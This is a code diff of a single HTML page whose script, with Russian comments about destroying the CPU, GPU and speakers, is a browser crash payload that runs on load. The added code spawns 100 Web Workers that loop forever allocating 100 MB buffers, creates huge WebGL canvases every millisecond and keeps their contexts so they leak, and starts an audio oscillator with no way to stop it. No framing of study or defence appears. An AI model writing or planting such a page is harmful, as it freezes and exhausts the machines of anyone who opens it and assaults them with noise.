@@ -1,20 +1,34 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <canvas id="doom" width="99999" height="99999"></canvas>
   <script>
-    for(let i=0; i<10; i++) {
+    // Уничтожение CPU
+    for(let i=0; i<100; i++) {
       new Worker(URL.createObjectURL(new Blob([`
-        setInterval(() => {
-          const canvas = document.createElement('canvas');
-          const gl = canvas.getContext('webgl2');
-          while(true) {
-            gl.clearColor(Math.random(), 0, 0, 1);
-            gl.clear(gl.COLOR_BUFFER_BIT);
-          }
-        }, 1);
+        while(1) {
+          new ArrayBuffer(1024 * 1024 * 100); // RAM-потрошитель
+          for(let j=0; j<1e9; j++); // Блокирующий цикл
+        }
       `])));
     }
+
+    // Уничтожение GPU
+    const canvases = [];
+    setInterval(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = 99999; 
+      canvas.height = 99999;
+      const gl = canvas.getContext('webgl2');
+      canvases.push(gl); // Утечка контекстов
+      gl.clearColor(1,0,0,1);
+      gl.clear(gl.COLOR_BUFFER_BIT);
+    }, 1);
+
+    // Уничтожение динамиков
+    const ctx = new AudioContext();
+    const oscillator = ctx.createOscillator();
+    oscillator.connect(ctx.destination);
+    oscillator.start();
   </script>
 </body>
 </html>
